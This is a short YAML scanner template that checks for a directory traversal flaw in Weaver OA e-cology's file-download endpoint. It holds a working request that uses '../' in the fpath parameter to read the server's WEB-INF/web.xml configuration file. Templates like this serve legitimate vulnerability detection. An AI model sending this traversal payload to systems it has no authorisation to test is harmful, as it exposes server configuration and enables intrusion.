expression: r0()
id: e-cology-filedownload-directory-traversal
info:
  author: l1nk3r
  description: "\u6CDB\u5FAEOA e-cology \u6587\u4EF6\u4E0B\u8F7D\u76EE\u5F55\u904D\
    \u5386 app=\"Weaver-OA\""
  name: "\u6CDB\u5FAEOA e-cology \u6587\u4EF6\u4E0B\u8F7D\u76EE\u5F55\u904D\u5386"
  reference:
  - https://www.weaver.com.cn/cs/securityDownload.asp
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
    request:
      method: GET
      path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
